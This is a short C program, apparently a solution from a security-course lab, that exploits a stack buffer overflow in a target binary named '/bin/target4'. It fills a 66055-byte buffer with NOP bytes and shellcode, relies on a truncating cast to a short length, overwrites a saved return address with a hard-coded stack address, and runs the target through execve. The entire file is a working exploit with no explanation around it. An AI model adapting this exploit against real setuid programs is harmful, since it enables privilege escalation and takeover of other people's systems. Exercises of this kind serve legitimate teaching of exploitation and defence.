#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/bin/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[66055];	                 // cast to short --> truncates to 519
  memset(buf, 0x90, sizeof(buf) - 1);	 // set NOPs

  memcpy(buf, shellcode, sizeof(shellcode) - 1); 
  *(unsigned int *)(buf+528)=0xfffeda34; // sizeof(buf) + 4 for int + 4 for fp
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
